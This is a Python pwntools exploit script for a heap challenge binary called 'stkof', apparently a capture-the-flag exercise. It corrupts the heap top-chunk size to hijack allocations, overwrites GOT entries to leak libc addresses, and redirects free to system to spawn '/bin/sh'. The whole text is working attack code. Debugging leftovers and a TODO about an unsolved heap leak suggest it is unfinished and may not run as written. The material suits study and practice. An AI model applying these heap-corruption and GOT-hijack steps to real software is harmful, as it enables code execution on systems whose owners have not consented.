from pwn import *

context.log_level = 'debug'

r = process('./stkof')
elf = ELF('./stkof')

# copied from elf.py: def bss(self, offset=0)
def getSection(name):
  orig_bss = elf.get_section_by_name(name).header.sh_addr
  curr_bss = orig_bss - elf.load_addr + elf.address
  return curr_bss

#system_plt = elf.plt['system']
#print 'system_plt= ' + hex(system_plt)
free_got = elf.got['free']
print 'free_got= ' + hex(free_got)
puts_plt = elf.plt['puts']
print 'puts_plt= ' + hex(puts_plt)
puts_got = elf.got['puts']
print 'puts_got= ' + hex(puts_got)
got0= elf.get_section_by_name('.got.plt').header.sh_addr
print 'got0= ' + hex(got0)
fake_chunk = got0 + 2 - 8
print 'fake_chunk= ' + hex(fake_chunk)
chunklist=0x602140

def add(size):
  r.sendline('1')
  r.sendline(str(size))
  r.recvuntil('\n')
  r.recvuntil('\n')

def free(index):
  r.sendline('3')
  r.sendline(str(index))
  data = r.recvuntil('\n', drop = True)
  return data

def edit(index, content):
  r.sendline('2')
  r.sendline(str(index))
  r.sendline(str(len(content)))
  r.send(content)
  r.recvuntil('\n')

def exp():
#  print p64(-1)
  print p64(0xffffffffffffffff)
  add(0x80)  # 1
  add(0x80)  # 2
  add(0x80)  # 3 <-
  free(3)
  payload = p64(0xffffffffffffffff).rjust(0x80 + 0x10, '\0')
  edit(2, payload) #overwrite size of 3(top chunk) to -1
  gdb.attach(r)
  add(0x80) # TODO how to leak heap addr 
  add(0x80) # 6 chunklist
  edit(6, p64(free_got) + p64(puts_got)) # chunklist[0] = free_got, chunklist[1] = puts_got  
  
  
  edit(0, p64(puts_plt))
  data = free(1)
  puts_addr = u64(data + '\0' * 2)
  print 'puts_addr= ' + hex(puts_addr)
  
  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
  system_addr = puts_addr + (libc.symbols['system'] - libc.symbols['puts'])
  print 'system_addr= ' + hex(system_addr)
  
  edit(0, p64(system_addr))
  edit(2, '/bin/sh')
  free(2)  
  r.interactive()


if __name__ == '__main__':
  exp()
